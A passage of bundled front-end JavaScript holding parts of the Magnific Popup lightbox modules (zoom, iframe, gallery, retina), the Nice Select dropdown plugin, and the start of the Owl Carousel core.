                (o = c(t)).css(e._getOffset()),
                  e.wrap.append(o),
                  (s = setTimeout(function () {
                    o.css(e._getOffset(!0)),
                      (s = setTimeout(function () {
                        u(),
                          setTimeout(function () {
                            o.remove(), (t = o = null), C("ZoomAnimationEnded");
                          }, 16);
                      }, r));
                  }, 16));
              }
            }),
              w(l + n, function () {
                if (e._allowZoom()) {
                  if ((clearTimeout(s), (e.st.removalDelay = r), !t)) {
                    if (!(t = e._getItemToZoom())) return;
                    o = c(t);
                  }
                  o.css(e._getOffset(!0)),
                    e.wrap.append(o),
                    e.content.css("visibility", "hidden"),
                    setTimeout(function () {
                      o.css(e._getOffset());
                    }, 16);
                }
              }),
              w(a + n, function () {
                e._allowZoom() && (u(), o && o.remove(), (t = null));
              });
          }
        },
        _allowZoom: function () {
          return "image" === e.currItem.type;
        },
        _getItemToZoom: function () {
          return !!e.currItem.hasSize && e.currItem.img;
        },
        _getOffset: function (i) {
          var n,
            s = (n = i
              ? e.currItem.img
              : e.st.zoom.opener(e.currItem.el || e.currItem)).offset(),
            o = parseInt(n.css("padding-top"), 10),
            r = parseInt(n.css("padding-bottom"), 10);
          s.top -= t(window).scrollTop() - o;
          var a = {
            width: n.width(),
            height: (y ? n.innerHeight() : n[0].offsetHeight) - r - o,
          };
          return (
            void 0 === j &&
              (j = void 0 !== document.createElement("p").style.MozTransform),
            j
              ? (a["-moz-transform"] = a.transform =
                  "translate(" + s.left + "px," + s.top + "px)")
              : ((a.left = s.left), (a.top = s.top)),
            a
          );
        },
      },
    });
    var H = "iframe",
      L = function (t) {
        if (e.currTemplate[H]) {
          var i = e.currTemplate[H].find("iframe");
          i.length &&
            (t || (i[0].src = "//about:blank"),
            e.isIE8 && i.css("display", t ? "block" : "none"));
        }
      };
    t.magnificPopup.registerModule(H, {
      options: {
        markup:
          '<div class="mfp-iframe-scaler"><div class="mfp-close"></div><iframe class="mfp-iframe" src="//about:blank" frameborder="0" allowfullscreen></iframe></div>',
        srcAction: "iframe_src",
        patterns: {
          youtube: {
            index: "youtube.com",
            id: "v=",
            src: "//www.youtube.com/embed/%id%?autoplay=1",
          },
          vimeo: {
            index: "vimeo.com/",
            id: "/",
            src: "//player.vimeo.com/video/%id%?autoplay=1",
          },
          gmaps: { index: "//maps.google.", src: "%id%&output=embed" },
        },
      },
      proto: {
        initIframe: function () {
          e.types.push(H),
            w("BeforeChange", function (t, e, i) {
              e !== i && (e === H ? L() : i === H && L(!0));
            }),
            w(a + "." + H, function () {
              L();
            });
        },
        getIframe: function (i, n) {
          var s = i.src,
            o = e.st.iframe;
          t.each(o.patterns, function () {
            return s.indexOf(this.index) > -1
              ? (this.id &&
                  (s =
                    "string" == typeof this.id
                      ? s.substr(
                          s.lastIndexOf(this.id) + this.id.length,
                          s.length
                        )
                      : this.id.call(this, s)),
                (s = this.src.replace("%id%", s)),
                !1)
              : void 0;
          });
          var r = {};
          return (
            o.srcAction && (r[o.srcAction] = s),
            e._parseMarkup(n, r, i),
            e.updateStatus("ready"),
            n
          );
        },
      },
    });
    var z = function (t) {
        var i = e.items.length;
        return t > i - 1 ? t - i : 0 > t ? i + t : t;
      },
      W = function (t, e, i) {
        return t.replace(/%curr%/gi, e + 1).replace(/%total%/gi, i);
      };
    t.magnificPopup.registerModule("gallery", {
      options: {
        enabled: !1,
        arrowMarkup:
          '<button title="%title%" type="button" class="mfp-arrow mfp-arrow-%dir%"></button>',
        preload: [0, 2],
        navigateByImgClick: !0,
        arrows: !0,
        tPrev: "Previous (Left arrow key)",
        tNext: "Next (Right arrow key)",
        tCounter: "%curr% of %total%",
      },
      proto: {
        initGallery: function () {
          var i = e.st.gallery,
            s = ".mfp-gallery";
          return (
            (e.direction = !0),
            !(!i || !i.enabled) &&
              ((o += " mfp-gallery"),
              w(u + s, function () {
                i.navigateByImgClick &&
                  e.wrap.on("click" + s, ".mfp-img", function () {
                    return e.items.length > 1 ? (e.next(), !1) : void 0;
                  }),
                  n.on("keydown" + s, function (t) {
                    37 === t.keyCode ? e.prev() : 39 === t.keyCode && e.next();
                  });
              }),
              w("UpdateStatus" + s, function (t, i) {
                i.text &&
                  (i.text = W(i.text, e.currItem.index, e.items.length));
              }),
              w(c + s, function (t, n, s, o) {
                var r = e.items.length;
                s.counter = r > 1 ? W(i.tCounter, o.index, r) : "";
              }),
              w("BuildControls" + s, function () {
                if (e.items.length > 1 && i.arrows && !e.arrowLeft) {
                  var n = i.arrowMarkup,
                    s = (e.arrowLeft = t(
                      n.replace(/%title%/gi, i.tPrev).replace(/%dir%/gi, "left")
                    ).addClass(m)),
                    o = (e.arrowRight = t(
                      n
                        .replace(/%title%/gi, i.tNext)
                        .replace(/%dir%/gi, "right")
                    ).addClass(m));
                  s.click(function () {
                    e.prev();
                  }),
                    o.click(function () {
                      e.next();
                    }),
                    e.container.append(s.add(o));
                }
              }),
              w(d + s, function () {
                e._preloadTimeout && clearTimeout(e._preloadTimeout),
                  (e._preloadTimeout = setTimeout(function () {
                    e.preloadNearbyImages(), (e._preloadTimeout = null);
                  }, 16));
              }),
              void w(a + s, function () {
                n.off(s),
                  e.wrap.off("click" + s),
                  (e.arrowRight = e.arrowLeft = null);
              }))
          );
        },
        next: function () {
          (e.direction = !0), (e.index = z(e.index + 1)), e.updateItemHTML();
        },
        prev: function () {
          (e.direction = !1), (e.index = z(e.index - 1)), e.updateItemHTML();
        },
        goTo: function (t) {
          (e.direction = t >= e.index), (e.index = t), e.updateItemHTML();
        },
        preloadNearbyImages: function () {
          var t,
            i = e.st.gallery.preload,
            n = Math.min(i[0], e.items.length),
            s = Math.min(i[1], e.items.length);
          for (t = 1; t <= (e.direction ? s : n); t++)
            e._preloadItem(e.index + t);
          for (t = 1; t <= (e.direction ? n : s); t++)
            e._preloadItem(e.index - t);
        },
        _preloadItem: function (i) {
          if (((i = z(i)), !e.items[i].preloaded)) {
            var n = e.items[i];
            n.parsed || (n = e.parseEl(i)),
              C("LazyLoad", n),
              "image" === n.type &&
                (n.img = t('<img class="mfp-img" />')
                  .on("load.mfploader", function () {
                    n.hasSize = !0;
                  })
                  .on("error.mfploader", function () {
                    (n.hasSize = !0), (n.loadError = !0), C("LazyLoadError", n);
                  })
                  .attr("src", n.src)),
              (n.preloaded = !0);
          }
        },
      },
    });
    var F = "retina";
    t.magnificPopup.registerModule(F, {
      options: {
        replaceSrc: function (t) {
          return t.src.replace(/\.\w+$/, function (t) {
            return "@2x" + t;
          });
        },
        ratio: 1,
      },
      proto: {
        initRetina: function () {
          if (window.devicePixelRatio > 1) {
            var t = e.st.retina,
              i = t.ratio;
            (i = isNaN(i) ? i() : i) > 1 &&
              (w("ImageHasSize." + F, function (t, e) {
                e.img.css({
                  "max-width": e.img[0].naturalWidth / i,
                  width: "100%",
                });
              }),
              w("ElementParse." + F, function (e, n) {
                n.src = t.replaceSrc(n, i);
              }));
          }
        },
      },
    }),
      T();
  }),
  (function (t) {
    t.fn.niceSelect = function (e) {
      function i(e) {
        e.after(
          t("<div></div>")
            .addClass("nice-select")
            .addClass(e.attr("class") || "")
            .addClass(e.attr("disabled") ? "disabled" : "")
            .attr("tabindex", e.attr("disabled") ? null : "0")
            .html('<span class="current"></span><ul class="list"></ul>')
        );
        var i = e.next(),
          n = e.find("option"),
          s = e.find("option:selected");
        i.find(".current").html(s.data("display") || s.text()),
          n.each(function (e) {
            var n = t(this),
              s = n.data("display");
            i.find("ul").append(
              t("<li></li>")
                .attr("data-value", n.val())
                .attr("data-display", s || null)
                .addClass(
                  "option" +
                    (n.is(":selected") ? " selected" : "") +
                    (n.is(":disabled") ? " disabled" : "")
                )
                .html(n.text())
            );
          });
      }
      if ("string" == typeof e)
        return (
          "update" == e
            ? this.each(function () {
                var e = t(this),
                  n = t(this).next(".nice-select"),
                  s = n.hasClass("open");
                n.length && (n.remove(), i(e), s && e.next().trigger("click"));
              })
            : "destroy" == e
            ? (this.each(function () {
                var e = t(this),
                  i = t(this).next(".nice-select");
                i.length && (i.remove(), e.css("display", ""));
              }),
              0 == t(".nice-select").length && t(document).off(".nice_select"))
            : console.log('Method "' + e + '" does not exist.'),
          this
        );
      this.hide(),
        this.each(function () {
          var e = t(this);
          e.next().hasClass("nice-select") || i(e);
        }),
        t(document).off(".nice_select"),
        t(document).on("click.nice_select", ".nice-select", function (e) {
          var i = t(this);
          t(".nice-select").not(i).removeClass("open"),
            i.toggleClass("open"),
            i.hasClass("open")
              ? (i.find(".option"),
                i.find(".focus").removeClass("focus"),
                i.find(".selected").addClass("focus"))
              : i.focus();
        }),
        t(document).on("click.nice_select", function (e) {
          0 === t(e.target).closest(".nice-select").length &&
            t(".nice-select").removeClass("open").find(".option");
        }),
        t(document).on(
          "click.nice_select",
          ".nice-select .option:not(.disabled)",
          function (e) {
            var i = t(this),
              n = i.closest(".nice-select");
            n.find(".selected").removeClass("selected"), i.addClass("selected");
            var s = i.data("display") || i.text();
            n.find(".current").text(s),
              n.prev("select").val(i.data("value")).trigger("change");
          }
        ),
        t(document).on("keydown.nice_select", ".nice-select", function (e) {
          var i = t(this),
            n = t(i.find(".focus") || i.find(".list .option.selected"));
          if (32 == e.keyCode || 13 == e.keyCode)
            return (
              i.hasClass("open") ? n.trigger("click") : i.trigger("click"), !1
            );
          if (40 == e.keyCode) {
            if (i.hasClass("open")) {
              var s = n.nextAll(".option:not(.disabled)").first();
              s.length > 0 &&
                (i.find(".focus").removeClass("focus"), s.addClass("focus"));
            } else i.trigger("click");
            return !1;
          }
          if (38 == e.keyCode) {
            if (i.hasClass("open")) {
              var o = n.prevAll(".option:not(.disabled)").first();
              o.length > 0 &&
                (i.find(".focus").removeClass("focus"), o.addClass("focus"));
            } else i.trigger("click");
            return !1;
          }
          if (27 == e.keyCode) i.hasClass("open") && i.trigger("click");
          else if (9 == e.keyCode && i.hasClass("open")) return !1;
        });
      var n = document.createElement("a").style;
      return (
        (n.cssText = "pointer-events:auto"),
        "auto" !== n.pointerEvents && t("html").addClass("no-csspointerevents"),
        this
      );
    };
  })(jQuery),
  (function (t, e, i, n) {
    function s(e, i) {
      (this.settings = null),
        (this.options = t.extend({}, s.Defaults, i)),
        (this.$element = t(e)),
        (this._handlers = {}),
        (this._plugins = {}),
        (this._supress = {}),
        (this._current = null),
        (this._speed = null),
        (this._coordinates = []),
        (this._breakpoint = null),
        (this._width = null),
        (this._items = []),
        (this._clones = []),
        (this._mergers = []),
        (this._widths = []),
        (this._invalidated = {}),
        (this._pipe = []),
        (this._drag = {
          time: null,
          target: null,
          pointer: null,
          stage: { start: null, current: null },
          direction: null,
        }),
        (this._states = {
          current: {},
          tags: {
            initializing: ["busy"],
            animating: ["busy"],
            dragging: ["interacting"],
          },
        }),
        t.each(
          ["onResize", "onThrottledResize"],
          t.proxy(function (e, i) {
            this._handlers[i] = t.proxy(this[i], this);
          }, this)
        ),
        t.each(
          s.Plugins,
          t.proxy(function (t, e) {
            this._plugins[t.charAt(0).toLowerCase() + t.slice(1)] = new e(this);
          }, this)
        ),
        t.each(
          s.Workers,
          t.proxy(function (e, i) {
            this._pipe.push({ filter: i.filter, run: t.proxy(i.run, this) });
          }, this)
        ),
        this.setup(),
        this.initialize();
    }
    (s.Defaults = {
      items: 3,
      loop: !1,
      center: !1,
      rewind: !1,
      checkVisibility: !0,
      mouseDrag: !0,
      touchDrag: !0,
      pullDrag: !0,
      freeDrag: !1,
      margin: 0,
      stagePadding: 0,
      merge: !1,
      mergeFit: !0,
      autoWidth: !1,
      startPosition: 0,
      rtl: !1,
      smartSpeed: 250,
      fluidSpeed: !1,
      dragEndSpeed: !1,
      responsive: {},
      responsiveRefreshRate: 200,
      responsiveBaseElement: e,
      fallbackEasing: "swing",
      slideTransition: "",
      info: !1,
      nestedItemSelector: !1,
      itemElement: "div",
      stageElement: "div",
      refreshClass: "owl-refresh",
      loadedClass: "owl-loaded",
      loadingClass: "owl-loading",
      rtlClass: "owl-rtl",
      responsiveClass: "owl-responsive",
      dragClass: "owl-drag",
      itemClass: "owl-item",
      stageClass: "owl-stage",
      stageOuterClass: "owl-stage-outer",
      grabClass: "owl-grab",
    }),
      (s.Width = { Default: "default", Inner: "inner", Outer: "outer" }),
      (s.Type = { Event: "event", State: "state" }),
      (s.Plugins = {}),
      (s.Workers = [
        {
          filter: ["width", "settings"],
          run: function () {
            this._width = this.$element.width();
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function (t) {
            t.current =
              this._items && this._items[this.relative(this._current)];
          },
        },
        {
          filter: ["items", "settings"],
          run: function () {
            this.$stage.children(".cloned").remove();
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function (t) {
            var e = this.settings.margin || "",
              i = !this.settings.autoWidth,
              n = this.settings.rtl,
              s = {
                width: "auto",
                "margin-left": n ? e : "",
                "margin-right": n ? "" : e,
              };
            !i && this.$stage.children().css(s), (t.css = s);
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function (t) {
            var e =
                (this.width() / this.settings.items).toFixed(3) -
                this.settings.margin,
              i = null,
              n = this._items.length,
              s = !this.settings.autoWidth,
              o = [];
            for (t.items = { merge: !1, width: e }; n--; )
              (i = this._mergers[n]),
                (i =
                  (this.settings.mergeFit &&
                    Math.min(i, this.settings.items)) ||
                  i),
                (t.items.merge = i > 1 || t.items.merge),
                (o[n] = s ? e * i : this._items[n].width());
            this._widths = o;
          },
        },
        {
          filter: ["items", "settings"],
          run: function () {
            var e = [],
              i = this._items,
              n = this.settings,
              s = Math.max(2 * n.items, 4),
              o = 2 * Math.ceil(i.length / 2),
              r = n.loop && i.length ? (n.rewind ? s : Math.max(s, o)) : 0,
              a = "",
              l = "";
            for (r /= 2; r > 0; )
              e.push(this.normalize(e.length / 2, !0)),
                (a += i[e[e.length - 1]][0].outerHTML),
                e.push(this.normalize(i.length - 1 - (e.length - 1) / 2, !0)),
                (l = i[e[e.length - 1]][0].outerHTML + l),
                (r -= 1);
            (this._clones = e),
              t(a).addClass("cloned").appendTo(this.$stage),
              t(l).addClass("cloned").prependTo(this.$stage);
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function () {
            for (
              var t = this.settings.rtl ? 1 : -1,
                e = this._clones.length + this._items.length,
                i = -1,
                n = 0,
                s = 0,
                o = [];
              ++i < e;

            )
              (n = o[i - 1] || 0),
                (s = this._widths[this.relative(i)] + this.settings.margin),
                o.push(n + s * t);
            this._coordinates = o;
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function () {
            var t = this.settings.stagePadding,
              e = this._coordinates,
              i = {
                width: Math.ceil(Math.abs(e[e.length - 1])) + 2 * t,
                "padding-left": t || "",
                "padding-right": t || "",
              };
            this.$stage.css(i);
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function (t) {
            var e = this._coordinates.length,
              i = !this.settings.autoWidth,
              n = this.$stage.children();
            if (i && t.items.merge)
              for (; e--; )
                (t.css.width = this._widths[this.relative(e)]),
                  n.eq(e).css(t.css);
            else i && ((t.css.width = t.items.width), n.css(t.css));
          },
        },
        {
          filter: ["items"],
          run: function () {
            this._coordinates.length < 1 && this.$stage.removeAttr("style");
          },
        },
        {
          filter: ["width", "items", "settings"],
          run: function (t) {
            (t.current = t.current
              ? this.$stage.children().index(t.current)
              : 0),
              (t.current = Math.max(
                this.minimum(),
                Math.min(this.maximum(), t.current)
              )),
              this.reset(t.current);
          },
        },
        {
          filter: ["position"],
          run: function () {
            this.animate(this.coordinates(this._current));
          },
        },
        {
          filter: ["width", "position", "items", "settings"],
          run: function () {
            var t,
              e,
              i,
              n,
              s = this.settings.rtl ? 1 : -1,
              o = 2 * this.settings.stagePadding,
              r = this.coordinates(this.current()) + o,
              a = r + this.width() * s,
              l = [];
            for (i = 0, n = this._coordinates.length; i < n; i++)
              (t = this._coordinates[i - 1] || 0),
                (e = Math.abs(this._coordinates[i]) + o * s),
                ((this.op(t, "<=", r) && this.op(t, ">", a)) ||
                  (this.op(e, "<", r) && this.op(e, ">", a))) &&
                  l.push(i);
            this.$stage.children(".active").removeClass("active"),
              this.$stage
                .children(":eq(" + l.join("), :eq(") + ")")
                .addClass("active"),
              this.$stage.children(".center").removeClass("center"),
              this.settings.center &&
                this.$stage.children().eq(this.current()).addClass("center");
          },
        },
      ]),
      (s.prototype.initializeStage = function () {
        (this.$stage = this.$element.find("." + this.settings.stageClass)),
          this.$stage.length ||
            (this.$element.addClass(this.options.loadingClass),
            (this.$stage = t("<" + this.settings.stageElement + ">", {
              class: this.settings.stageClass,
            }).wrap(t("<div/>", { class: this.settings.stageOuterClass }))),
            this.$element.append(this.$stage.parent()));
      }),
      (s.prototype.initializeItems = function () {
        var e = this.$element.find(".owl-item");
        if (e.length)
          return (
            (this._items = e.get().map(function (e) {
              return t(e);
            })),
            (this._mergers = this._items.map(function () {
              return 1;
            })),
            void this.refresh()
          );
        this.replace(this.$element.children().not(this.$stage.parent())),
          this.isVisible() ? this.refresh() : this.invalidate("width"),
          this.$element
            .removeClass(this.options.loadingClass)
            .addClass(this.options.loadedClass);
      }),
      (s.prototype.initialize = function () {
        var t, e, i;
        (this.enter("initializing"),
        this.trigger("initialize"),
        this.$element.toggleClass(this.settings.rtlClass, this.settings.rtl),
        this.settings.autoWidth && !this.is("pre-loading")) &&
          ((t = this.$element.find("img")),
          (e = this.settings.nestedItemSelector
            ? "." + this.settings.nestedItemSelector
            : n),
          (i = this.$element.children(e).width()),
          t.length && i <= 0 && this.preloadAutoWidthImages(t));
        this.initializeStage(),
          this.initializeItems(),
          this.registerEventHandlers(),
          this.leave("initializing"),
          this.trigger("initialized");
      }),
      (s.prototype.isVisible = function () {
        return !this.settings.checkVisibility || this.$element.is(":visible");
      }),
      (s.prototype.setup = function () {
        var e = this.viewport(),
          i = this.options.responsive,
          n = -1,
          s = null;
        i
          ? (t.each(i, function (t) {
              t <= e && t > n && (n = Number(t));
            }),
            "function" ==
              typeof (s = t.extend({}, this.options, i[n])).stagePadding &&
              (s.stagePadding = s.stagePadding()),
            delete s.responsive,
            s.responsiveClass &&
              this.$element.attr(
                "class",
                this.$element
                  .attr("class")
                  .replace(
                    new RegExp(
                      "(" + this.options.responsiveClass + "-)\\S+\\s",
                      "g"
                    ),
                    "$1" + n
                  )
              ))
          : (s = t.extend({}, this.options)),
          this.trigger("change", { property: { name: "settings", value: s } }),
          (this._breakpoint = n),
          (this.settings = s),
          this.invalidate("settings"),
          this.trigger("changed", {
            property: { name: "settings", value: this.settings },
          });
      }),
      (s.prototype.optionsLogic = function () {
        this.settings.autoWidth &&
          ((this.settings.stagePadding = !1), (this.settings.merge = !1));
      }),
      (s.prototype.prepare = function (e) {
        var i = this.trigger("prepare", { content: e });
        return (
          i.data ||
            (i.data = t("<" + this.settings.itemElement + "/>")
              .addClass(this.options.itemClass)
              .append(e)),
          this.trigger("prepared", { content: i.data }),
          i.data
        );
      }),
      (s.prototype.update = function () {
        for (
          var e = 0,
            i = this._pipe.length,
            n = t.proxy(function (t) {
              return this[t];
            }, this._invalidated),
            s = {};
          e < i;

        )
          (this._invalidated.all ||
            t.grep(this._pipe[e].filter, n).length > 0) &&
            this._pipe[e].run(s),
            e++;
        (this._invalidated = {}), !this.is("valid") && this.enter("valid");
      }),
      (s.prototype.width = function (t) {
        switch ((t = t || s.Width.Default)) {
          case s.Width.Inner:
          case s.Width.Outer:
            return this._width;
          default:
            return (
              this._width -
              2 * this.settings.stagePadding +
              this.settings.margin
            );
        }
      }),
      (s.prototype.refresh = function () {
        this.enter("refreshing"),
          this.trigger("refresh"),
          this.setup(),
          this.optionsLogic(),
          this.$element.addClass(this.options.refreshClass),
          this.update(),
          this.$element.removeClass(this.options.refreshClass),
          this.leave("refreshing"),
          this.trigger("refreshed");
      }),
      (s.prototype.onThrottledResize = function () {
        e.clearTimeout(this.resizeTimer),
          (this.resizeTimer = e.setTimeout(
            this._handlers.onResize,
            this.settings.responsiveRefreshRate
          ));
      }),
      (s.prototype.onResize = function () {
        return (
          !!this._items.length &&
          this._width !== this.$element.width() &&
          !!this.isVisible() &&
          (this.enter("resizing"),
          this.trigger("resize").isDefaultPrevented()
            ? (this.leave("resizing"), !1)
            : (this.invalidate("width"),
              this.refresh(),
              this.leave("resizing"),
              void this.trigger("resized")))
        );
      }),
      (s.prototype.registerEventHandlers = function () {
        t.support.transition &&
          this.$stage.on(
            t.support.transition.end + ".owl.core",
            t.proxy(this.onTransitionEnd, this)
          ),
          !1 !== this.settings.responsive &&
            this.on(e, "resize", this._handlers.onThrottledResize),
          this.settings.mouseDrag &&
            (this.$element.addClass(this.options.dragClass),
            this.$stage.on(
              "mousedown.owl.core",
              t.proxy(this.onDragStart, this)
            ),
            this.$stage.on(
              "dragstart.owl.core selectstart.owl.core",
              function () {
                return !1;
              }
            )),
          this.settings.touchDrag &&
            (this.$stage.on(
              "touchstart.owl.core",
              t.proxy(this.onDragStart, this)
            ),
            this.$stage.on(
              "touchcancel.owl.core",
              t.proxy(this.onDragEnd, this)
            ));
      }),
      (s.prototype.onDragStart = function (e) {
        var n = null;
        3 !== e.which &&
          (t.support.transform
            ? (n = {
                x: (n = this.$stage
                  .css("transform")
                  .replace(/.*\(|\)| /g, "")
                  .split(","))[16 === n.length ? 12 : 4],
                y: n[16 === n.length ? 13 : 5],
              })
            : ((n = this.$stage.position()),
              (n = {
                x: this.settings.rtl
                  ? n.left +
                    this.$stage.width() -
                    this.width() +
                    this.settings.margin
                  : n.left,
                y: n.top,
              })),
          this.is("animating") &&
            (t.support.transform ? this.animate(n.x) : this.$stage.stop(),
            this.invalidate("position")),
          this.$element.toggleClass(
            this.options.grabClass,
            "mousedown" === e.type
          ),
          this.speed(0),
          (this._drag.time = new Date().getTime()),
          (this._drag.target = t(e.target)),
          (this._drag.stage.start = n),
          (this._drag.stage.current = n),
          (this._drag.pointer = this.pointer(e)),
          t(i).on(
            "mouseup.owl.core touchend.owl.core",
            t.proxy(this.onDragEnd, this)
          ),
          t(i).one(
            "mousemove.owl.core touchmove.owl.core",
            t.proxy(function (e) {
              var n = this.difference(this._drag.pointer, this.pointer(e));
              t(i).on(
                "mousemove.owl.core touchmove.owl.core",
                t.proxy(this.onDragMove, this)
              ),
                (Math.abs(n.x) < Math.abs(n.y) && this.is("valid")) ||
                  (e.preventDefault(),
                  this.enter("dragging"),
                  this.trigger("drag"));
            }, this)
          ));
      }),
      (s.prototype.onDragMove = function (t) {
        var e = null,
          i = null,
          n = null,
          s = this.difference(this._drag.pointer, this.pointer(t)),
          o = this.difference(this._drag.stage.start, s);
        this.is("dragging") &&
          (t.preventDefault(),
          this.settings.loop
            ? ((e = this.coordinates(this.minimum())),
              (i = this.coordinates(this.maximum() + 1) - e),
              (o.x = ((((o.x - e) % i) + i) % i) + e))
            : ((e = this.settings.rtl
                ? this.coordinates(this.maximum())
                : this.coordinates(this.minimum())),
              (i = this.settings.rtl
                ? this.coordinates(this.minimum())
                : this.coordinates(this.maximum())),
              (n = this.settings.pullDrag ? (-1 * s.x) / 5 : 0),
              (o.x = Math.max(Math.min(o.x, e + n), i + n))),
          (this._drag.stage.current = o),
          this.animate(o.x));
      }),
      (s.prototype.onDragEnd = function (e) {
        var n = this.difference(this._drag.pointer, this.pointer(e)),
          s = this._drag.stage.current,
          o = (n.x > 0) ^ this.settings.rtl ? "left" : "right";
        t(i).off(".owl.core"),
          this.$element.removeClass(this.options.grabClass),
          ((0 !== n.x && this.is("dragging")) || !this.is("valid")) &&
            (this.speed(this.settings.dragEndSpeed || this.settings.smartSpeed),
            this.current(
              this.closest(s.x, 0 !== n.x ? o : this._drag.direction)
            ),
            this.invalidate("position"),
            this.update(),
            (this._drag.direction = o),
            (Math.abs(n.x) > 3 ||
              new Date().getTime() - this._drag.time > 300) &&
              this._drag.target.one("click.owl.core", function () {
                return !1;
              })),
          this.is("dragging") &&
            (this.leave("dragging"), this.trigger("dragged"));
      }),
      (s.prototype.closest = function (e, i) {
        var s = -1,
          o = this.width(),
          r = this.coordinates();
        return (
          this.settings.freeDrag ||
            t.each(
              r,
              t.proxy(function (t, a) {
                return (
                  "left" === i && e > a - 30 && e < a + 30
                    ? (s = t)
                    : "right" === i && e > a - o - 30 && e < a - o + 30
                    ? (s = t + 1)
                    : this.op(e, "<", a) &&
                      this.op(e, ">", r[t + 1] !== n ? r[t + 1] : a - o) &&
                      (s = "left" === i ? t + 1 : t),
                  -1 === s
                );
              }, this)
            ),
          this.settings.loop ||
            (this.op(e, ">", r[this.minimum()])
              ? (s = e = this.minimum())
              : this.op(e, "<", r[this.maximum()]) && (s = e = this.maximum())),
          s
        );
      }),
      (s.prototype.animate = function (e) {
        var i = this.speed() > 0;
        this.is("animating") && this.onTransitionEnd(),
          i && (this.enter("animating"), this.trigger("translate")),
          t.support.transform3d && t.support.transition
            ? this.$stage.css({
                transform: "translate3d(" + e + "px,0px,0px)",
                transition:
                  this.speed() / 1e3 +
                  "s" +
                  (this.settings.slideTransition
                    ? " " + this.settings.slideTransition
                    : ""),
              })
            : i
            ? this.$stage.animate(
                { left: e + "px" },
                this.speed(),
                this.settings.fallbackEasing,
                t.proxy(this.onTransitionEnd, this)
              )
            : this.$stage.css({ left: e + "px" });
      }),
      (s.prototype.is = function (t) {
        return this._states.current[t] && this._states.current[t] > 0;
      }),
      (s.prototype.current = function (t) {
        if (t === n) return this._current;
        if (0 === this._items.length) return n;
        if (((t = this.normalize(t)), this._current !== t)) {
          var e = this.trigger("change", {
            property: { name: "position", value: t },
          });
          e.data !== n && (t = this.normalize(e.data)),
            (this._current = t),
            this.invalidate("position"),
            this.trigger("changed", {
              property: { name: "position", value: this._current },
            });
        }
        return this._current;
      }),
      (s.prototype.invalidate = function (e) {
        return (
          "string" === t.type(e) &&
            ((this._invalidated[e] = !0),
            this.is("valid") && this.leave("valid")),
          t.map(this._invalidated, function (t, e) {
            return e;
          })
        );
      }),
      (s.prototype.reset = function (t) {
        (t = this.normalize(t)) !== n &&
          ((this._speed = 0),
          (this._current = t),
          this.suppress(["translate", "translated"]),
          this.animate(this.coordinates(t)),
          this.release(["translate", "translated"]));
      }),
      (s.prototype.normalize = function (t, e) {
        var i = this._items.length,
          s = e ? 0 : this._clones.length;
        return (
          !this.isNumeric(t) || i < 1
            ? (t = n)
            : (t < 0 || t >= i + s) &&
              (t = ((((t - s / 2) % i) + i) % i) + s / 2),
          t
        );
      }),
      (s.prototype.relative = function (t) {
        return (t -= this._clones.length / 2), this.normalize(t, !0);
      }),
      (s.prototype.maximum = function (t) {
        var e,
          i,
          n,
          s = this.settings,
          o = this._coordinates.length;
        if (s.loop) o = this._clones.length / 2 + this._items.length - 1;
        else if (s.autoWidth || s.merge) {
          if ((e = this._items.length))
            for (
              i = this._items[--e].width(), n = this.$element.width();
              e-- &&
              !((i += this._items[e].width() + this.settings.margin) > n);

            );
          o = e + 1;
        } else
          o = s.center ? this._items.length - 1 : this._items.length - s.items;
        return t && (o -= this._clones.length / 2), Math.max(o, 0);
      }),
      (s.prototype.minimum = function (t) {
        return t ? 0 : this._clones.length / 2;
      }),
      (s.prototype.items = function (t) {
        return t === n
          ? this._items.slice()
          : ((t = this.normalize(t, !0)), this._items[t]);
      }),
      (s.prototype.mergers = function (t) {
        return t === n
          ? this._mergers.slice()
          : ((t = this.normalize(t, !0)), this._mergers[t]);
      }),
      (s.prototype.clones = function (e) {
        var i = this._clones.length / 2,
          s = i + this._items.length,
          o = function (t) {
            return t % 2 == 0 ? s + t / 2 : i - (t + 1) / 2;
          };
        return e === n
          ? t.map(this._clones, function (t, e) {
              return o(e);
            })
          : t.map(this._clones, function (t, i) {
              return t === e ? o(i) : null;
            });
      }),
      (s.prototype.speed = function (t) {
        return t !== n && (this._speed = t), this._speed;
      }),
      (s.prototype.coordinates = function (e) {
        var i,
          s = 1,
          o = e - 1;
        return e === n
          ? t.map(
              this._coordinates,
              t.proxy(function (t, e) {
                return this.coordinates(e);
              }, this)
            )
          : (this.settings.center
              ? (this.settings.rtl && ((s = -1), (o = e + 1)),
                (i = this._coordinates[e]),
                (i +=
                  ((this.width() - i + (this._coordinates[o] || 0)) / 2) * s))
              : (i = this._coordinates[o] || 0),
            (i = Math.ceil(i)));
      }),
      (s.prototype.duration = function (t, e, i) {
        return 0 === i
          ? 0
          : Math.min(Math.max(Math.abs(e - t), 1), 6) *
              Math.abs(i || this.settings.smartSpeed);
      }),
      (s.prototype.to = function (t, e) {
        var i = this.current(),
          n = null,
          s = t - this.relative(i),
          o = (s > 0) - (s < 0),
          r = this._items.length,
          a = this.minimum(),
          l = this.maximum();
        this.settings.loop
          ? (!this.settings.rewind && Math.abs(s) > r / 2 && (s += -1 * o * r),
            (n = (((((t = i + s) - a) % r) + r) % r) + a) !== t &&
              n - s <= l &&
              n - s > 0 &&
              ((i = n - s), (t = n), this.reset(i)))
          : this.settings.rewind
          ? (t = ((t % (l += 1)) + l) % l)
          : (t = Math.max(a, Math.min(l, t))),
          this.speed(this.duration(i, t, e)),
          this.current(t),
          this.isVisible() && this.update();
      }),
      (s.prototype.next = function (t) {
        (t = t || !1), this.to(this.relative(this.current()) + 1, t);
      }),
      (s.prototype.prev = function (t) {
        (t = t || !1), this.to(this.relative(this.current()) - 1, t);
      }),
      (s.prototype.onTransitionEnd = function (t) {
        if (
          t !== n &&
          (t.stopPropagation(),
          (t.target || t.srcElement || t.originalTarget) !== this.$stage.get(0))
        )
          return !1;
        this.leave("animating"), this.trigger("translated");
      }),
      (s.prototype.viewport = function () {
        var n;
        return (
          this.options.responsiveBaseElement !== e
            ? (n = t(this.options.responsiveBaseElement).width())
            : e.innerWidth
            ? (n = e.innerWidth)
            : i.documentElement && i.documentElement.clientWidth
            ? (n = i.documentElement.clientWidth)
            : console.warn("Can not detect viewport width."),
          n
        );
      }),
